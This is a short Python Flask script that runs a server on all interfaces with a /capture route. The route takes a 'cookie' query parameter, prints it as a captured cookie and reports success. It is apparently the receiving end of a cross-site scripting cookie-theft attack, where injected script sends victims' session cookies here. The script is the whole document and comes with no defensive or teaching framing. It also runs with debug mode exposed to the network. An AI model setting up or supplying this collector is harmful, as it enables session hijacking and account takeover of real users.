from flask import Flask, request

app = Flask(__name__)

@app.route('/capture')
def capture_cookie():
    # Capture the cookie from the GET request
    cookie_data = request.args.get('cookie')
    # Log it or save it as needed
    print(f"Captured Cookie: {cookie_data}")
    return 'Cookie captured successfully!'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5001)
